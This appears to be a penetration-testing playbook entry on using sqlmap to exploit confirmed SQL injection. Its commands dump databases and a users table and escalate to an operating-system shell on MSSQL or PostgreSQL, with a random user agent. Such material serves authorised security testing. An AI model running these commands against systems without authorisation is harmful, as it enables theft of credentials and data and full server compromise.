# 05.04 sqlmap Automation

> Hand off to `sqlmap` after manual confirmation to dump DBs and escalate to OS shell on MSSQL/PostgreSQL.

## Overview

sqlmap detects + exploits all SQLi classes, dumps DB content, escalates to OS shell on MSSQL/PostgreSQL. Always use it AFTER manual confirmation so you know what's exploitable.

## Steps

- **Save a Burp request** to file (--method, headers, cookies preserved).
- **Run with -r req.txt** — sqlmap parses everything.
- **Escalate** — --os-shell, --os-pwn.
- **Stay tame** — `--batch --random-agent --level=3 --risk=2`.

## Commands

### Standard flow

```bash
sqlmap -r req.txt --batch --random-agent --level=3 --risk=2
sqlmap -r req.txt --batch --dbs
sqlmap -r req.txt --batch -D appdb --tables
sqlmap -r req.txt --batch -D appdb -T users --dump
```

### MSSQL OS shell

```bash
sqlmap -u 'http://<TARGET>/q.aspx?id=1' --os-shell
sqlmap -u 'http://<TARGET>/q.aspx?id=1' --os-pwn
```
